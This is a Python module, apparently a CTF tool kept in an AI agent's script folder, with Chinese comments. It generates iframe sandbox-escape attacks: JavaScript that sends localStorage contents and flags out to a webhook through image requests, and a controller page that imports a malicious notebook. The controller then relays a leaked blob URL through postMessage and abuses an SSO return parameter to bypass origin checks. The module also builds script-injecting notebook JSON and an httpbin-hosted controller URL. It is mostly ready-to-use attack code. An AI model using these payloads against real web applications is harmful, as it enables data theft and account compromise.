"""summary: iframe Sandbox 逃逸测试与 payload 生成工具

description:
  生成和测试 iframe sandbox 逃逸的 payload，覆盖以下场景：

  1. blob URL 顶级页面逃逸（Yipiter 核心技术）
  2. postMessage 跨窗口通信（sandboxed iframe → 控制器页面）
  3. SSO/OAuth 回调 blob URL 绕过（origin 继承绕过同域检查）
  4. 控制器页面生成（协调多步骤攻击）
  5. Notebook JSON 注入 payload 生成（适用于 Notebook 类应用）

  不依赖目标运行，纯 payload 生成和 HTML 模板生成工具。

  依赖: 无第三方依赖

  调用方式:
    import sys
    sys.path.insert(0, "$AGENT_DIR/scripts")
    from sandbox_escape import (
        generate_sandbox_test_payload,
        generate_controller_page,
        generate_notebook_payload,
        generate_sso_bypass_url,
    )

usage:
  作为库模块被 import。

level: intermediate
"""

import json
import base64
from typing import Optional
from urllib.parse import urlencode, quote


def generate_sandbox_test_payload(
    webhook_url: str,
    check_origin: str = "",
    flag_pattern: str = r"SK-CERT\{[^}]+\}",
) -> str:
    """生成 sandbox 逃逸测试的 JS payload。

    在 sandboxed iframe 中运行时：
    1. 检测 sandbox 权限
    2. 尝试通过 postMessage 泄露 blob URL
    3. 检测 localStorage 访问权限

    在顶级页面中运行时：
    1. 轮询 localStorage 等待 flag

    Args:
        webhook_url: 外泄数据的 webhook URL
        check_origin: 检测的 origin（如 'http://challenge:4173'）
        flag_pattern: flag 正则表达式（默认 SK-CERT 格式，可改为其他 CTF flag 格式）

    Returns:
        <script> 标签包裹的 JS payload 字符串
    """
    # 将 Python 正则转为 JS 正则字符串（去掉 r"" 前缀）
    flag_re_js = flag_pattern.replace("\\", "\\\\")
    js_code = f"""
(function() {{
  var WH = '{webhook_url}';
  var FLAG_RE = /{flag_re_js}/;

  function log(t, d) {{
    try {{
      new Image().src = WH + '/?t=' + encodeURIComponent(t)
        + '&d=' + encodeURIComponent(d || '') + '&_=' + Date.now();
    }} catch(e) {{}}
  }}

  // 检测环境
  log('loaded', location.href.substring(0, 100));
  log('top', window.top === window ? 'yes' : 'no');
  log('origin', typeof location.origin !== 'undefined' ? location.origin : 'undefined');

  // 检测 sandbox 权限
  try {{
    var ls = localStorage.getItem('test');
    log('localStorage', 'accessible');
  }} catch(e) {{
    log('localStorage', 'blocked: ' + e.message.substring(0, 50));
  }}

  try {{
    var w = window.open('about:blank');
    if (w) {{
      log('popups', 'allowed');
      w.close();
    }} else {{
      log('popups', 'blocked');
    }}
  }} catch(e) {{
    log('popups', 'error: ' + e.message.substring(0, 50));
  }}

  // 如果在 iframe 中，尝试 blob URL 逃逸
  if (window.top !== window) {{
    log('mode', 'iframe');

    // 方案 1：通过 postMessage 把 blob URL 传给 opener
    try {{
      if (top && top.opener) {{
        top.opener.postMessage(
          {{ t: 'blob_leak', href: location.href }},
          '*'
        );
        log('pm_sent', location.href.substring(0, 80));
      }} else {{
        log('no_opener', 'top.opener is null');
      }}
    }} catch(e) {{
      log('pm_error', e.message.substring(0, 50));
    }}

    // 方案 2：直接 window.open blob URL
    try {{
      var blobUrl = location.href;
      if (blobUrl.indexOf('blob:') === 0) {{
        window.open(blobUrl);
        log('open_blob', 'attempted');
      }}
    }} catch(e) {{
      log('open_error', e.message.substring(0, 50));
    }}

    return;
  }}

  // 顶级页面模式：轮询 localStorage
  log('mode', 'top_level');
  var lastData = null;
  var tk = 0;
  var iv = setInterval(function() {{
    tk++;
    try {{
      // 尝试常见的 localStorage key
      var keys = ['yipiii.users.v1', 'flag', 'users', 'app.users'];
      var allData = '';
      for (var i = 0; i < keys.length; i++) {{
        try {{
          var v = localStorage.getItem(keys[i]) || '';
          if (v && v !== lastData) {{
            allData += keys[i] + '=' + v.substring(0, 500) + ';';
          }}
        }} catch(e) {{}}
      }}

      if (allData) {{
        log('data', allData.substring(0, 3000));
        var m = allData.match(FLAG_RE);
        if (m) {{
          log('flag', m[0]);
          clearInterval(iv);
        }}
        lastData = allData;
      }}
    }} catch(e) {{
      log('poll_error', e.message.substring(0, 50));
    }}
    if (tk > 200) {{
      clearInterval(iv);
      log('timeout', 'polling stopped after 100s');
    }}
  }}, 500);
}})();
"""
    return f"<script>{js_code}</script>"


def generate_controller_page(
    challenge_url: str,
    notebook_url: str,
    webhook_url: str,
    sso_callback_path: str = "/auth/",
) -> str:
    """生成控制器页面 HTML。

    控制器页面负责：
    1. 打开目标应用并导入恶意 notebook
    2. 监听来自 sandboxed iframe 的 postMessage
    3. 收到 blob URL 后构造 SSO 回调 URL
    4. 打开 SSO 回调触发重定向到 blob URL

    Args:
        challenge_url: 目标应用的内网 URL（如 'http://challenge:4173'）
        notebook_url: 恶意 notebook JSON 的 URL
        webhook_url: 日志 webhook URL
        sso_callback_path: SSO 回调页面路径

    Returns:
        控制器页面 HTML 字符串
    """
    html = f"""<!doctype html>
<html>
<body>
<script>
var C = '{challenge_url}';
var N = '{notebook_url}';
var W = '{webhook_url}';

function P(t, d) {{
  try {{
    new Image().src = W + '/?t=' + encodeURIComponent(t)
      + '&d=' + encodeURIComponent(d || '') + '&_=' + Date.now();
  }} catch(e) {{}}
}}

P('ctrl', 'start');

// 步骤 1：打开目标应用并导入恶意 notebook
try {{
  window.open(C + '/new/?url=' + encodeURIComponent(N), 'seed');
  P('step1', 'opened_seed');
}} catch(e) {{
  P('step1_err', String(e));
}}

// 步骤 2：监听来自 sandboxed iframe 的 postMessage
window.addEventListener('message', function(ev) {{
  try {{
    if (!ev.data || ev.data.t !== 'blob_leak' || !ev.data.href) return;
    P('blob_received', ev.data.href.substring(0, 100));

    // 步骤 3：构造 SSO 回调 URL，return 参数设为 blob URL
    var ssoUrl = C + '{sso_callback_path}'
      + '?sso=callback&mode=login&token=x'
      + '&return=' + encodeURIComponent(ev.data.href);
    P('sso_url', ssoUrl.substring(0, 100));

    // 步骤 4：打开 SSO 回调页面
    window.open(ssoUrl, '_blank', 'noopener');
    P('step4', 'opened_sso');
  }} catch(ex) {{
    P('msg_error', String(ex));
  }}
}});
</script>
</body>
</html>"""
    return html


def generate_controller_url(
    challenge_url: str,
    notebook_url: str,
    webhook_url: str,
    sso_callback_path: str = "/auth/",
) -> str:
    """生成控制器页面的 httpbin.org/base64/ URL。

    Args:
        challenge_url: 目标应用内网 URL
        notebook_url: 恶意 notebook JSON URL
        webhook_url: 日志 webhook URL
        sso_callback_path: SSO 回调路径

    Returns:
        httpbin.org/base64/ 格式的 URL
    """
    html = generate_controller_page(
        challenge_url, notebook_url, webhook_url, sso_callback_path
    )
    b64 = base64.b64encode(html.encode()).decode()
    # URL-safe base64
    b64 = b64.replace("+", "-").replace("/", "_").rstrip("=")
    return f"https://httpbin.org/base64/{b64}"


def generate_notebook_payload(
    js_payload: str,
    notebook_name: str = "x",
) -> str:
    """生成恶意 notebook JSON。

    Args:
        js_payload: 要注入的 JS 代码（不含 <script> 标签）
        notebook_name: notebook 名称

    Returns:
        notebook JSON 字符串
    """
    notebook = {
        "nbformat": 4,
        "nbformat_minor": 5,
        "metadata": {"name": notebook_name, "yipiii": True},
        "cells": [{
            "cell_type": "code",
            "metadata": {},
            "source": ["print('x')\\n"],
            "execution_count": 1,
            "outputs": [{
                "output_type": "display_data",
                "data": {
                    "text/html": f"<script>{js_payload}</script>"
                },
                "metadata": {}
            }]
        }]
    }
    return json.dumps(notebook, separators=(",", ":"))


def generate_sso_bypass_url(
    challenge_url: str,
    blob_url: str,
    sso_path: str = "/auth/",
) -> str:
    """构造利用 blob URL 绕过 SSO 回调 origin 检查的 URL。

    Args:
        challenge_url: 目标应用 URL
        blob_url: blob URL（origin 将与 challenge_url 相同）
        sso_path: SSO 回调页面路径

    Returns:
        SSO 回调 URL
    """
    params = {
        "sso": "callback",
        "mode": "login",
        "token": "x",
        "return": blob_url,
    }
    return f"{challenge_url.rstrip('/')}{sso_path}?{urlencode(params)}"


def generate_sandbox_check_html() -> str:
    """生成 sandbox 权限检测页面 HTML。

    用于测试不同 sandbox 配置下的权限。

    Returns:
        检测页面 HTML
    """
    return """<!doctype html>
<html>
<body>
<h3>Sandbox 权限检测</h3>
<div id="results"></div>
<script>
var results = [];

// 检测 localStorage
try {
  localStorage.setItem('_test', '1');
  localStorage.removeItem('_test');
  results.push('localStorage: ✓ accessible');
} catch(e) {
  results.push('localStorage: ✗ blocked (' + e.message.substring(0, 40) + ')');
}

// 检测 Cookie
try {
  document.cookie = '_test=1';
  results.push('Cookie: ✓ ' + (document.cookie.indexOf('_test') >= 0 ? 'read/write' : 'write only'));
} catch(e) {
  results.push('Cookie: ✗ blocked');
}

// 检测 popups
try {
  var w = window.open('about:blank');
  results.push('window.open: ✓ ' + (w ? 'works' : 'returned null'));
  if (w) w.close();
} catch(e) {
  results.push('window.open: ✗ blocked');
}

// 检测 postMessage
try {
  window.parent.postMessage({type: 'test'}, '*');
  results.push('postMessage: ✓ can send');
} catch(e) {
  results.push('postMessage: ✗ ' + e.message.substring(0, 40));
}

// 检测 origin
results.push('origin: ' + (typeof location.origin !== 'undefined' ? location.origin : 'N/A'));
results.push('top === window: ' + (window.top === window));
results.push('location.href: ' + location.href.substring(0, 80));

document.getElementById('results').innerHTML =
  '<pre>' + results.join('\\n') + '</pre>';
</script>
</body>
</html>"""


def print_sandbox_reference():
    """打印 sandbox 权限参考表。"""
    print("""
iframe sandbox 权限参考
═══════════════════════════════════════════════════════════════

权限标志              | 允许的行为                 | 缺失后果
──────────────────────┼────────────────────────────┼──────────────────────
allow-scripts         | 执行 JavaScript            | JS 无法运行
allow-same-origin     | 保留原始 origin            | origin 变为 null
allow-popups          | window.open()              | 无法开新窗口
allow-popups-to-      | 新窗口不受 sandbox 限制    | 新窗口继承 sandbox
  escape-sandbox      |                            |
allow-forms           | 提交表单                   | 表单提交被阻止
allow-top-navigation  | 修改顶层窗口 location      | 不允许
allow-downloads       | 下载文件                   | 不允许

关键安全规则：
  • allow-scripts + allow-same-origin = 可以通过 JS 移除 sandbox（等于没有）
  • 安全配置通常只给 allow-scripts（origin 变为 null，无 localStorage/Cookie 权限）
  • blob URL 继承创建者 origin，但 sandbox 只在 iframe 上下文中生效
  • blob URL 作为顶级页面加载时，没有 sandbox 限制

常见逃逸路径：
  1. sandbox 有 allow-popups → window.open(blobUrl) → 新窗口无 sandbox
  2. sandbox 有 allow-popups → postMessage 传 blob URL → 外部页面重定向
  3. 无 allow-popups 但有 open redirect → 重定向到 blob URL
""")


if __name__ == "__main__":
    import sys

    if "--help" in sys.argv or "-h" in sys.argv:
        print(__doc__)
        sys.exit(0)

    if "--ref" in sys.argv:
        print_sandbox_reference()
        sys.exit(0)

    print("=" * 60)
    print("iframe Sandbox 逃逸测试工具")
    print("=" * 60)
    print()
    print("用法:")
    print("  作为库模块导入:")
    print("    from sandbox_escape import generate_sandbox_test_payload")
    print()
    print("  查看权限参考表:")
    print("    python sandbox_escape.py --ref")
    print()
    print("功能列表:")
    print("  generate_sandbox_test_payload()  - 生成 sandbox 逃逸测试 JS")
    print("  generate_controller_page()       - 生成控制器页面 HTML")
    print("  generate_controller_url()        - 生成 httpbin 控制器 URL")
    print("  generate_notebook_payload()      - 生成恶意 notebook JSON")
    print("  generate_sso_bypass_url()        - 构造 SSO blob URL 绕过")
    print("  generate_sandbox_check_html()    - 生成权限检测页面")
    print("  print_sandbox_reference()        - 打印权限参考表")
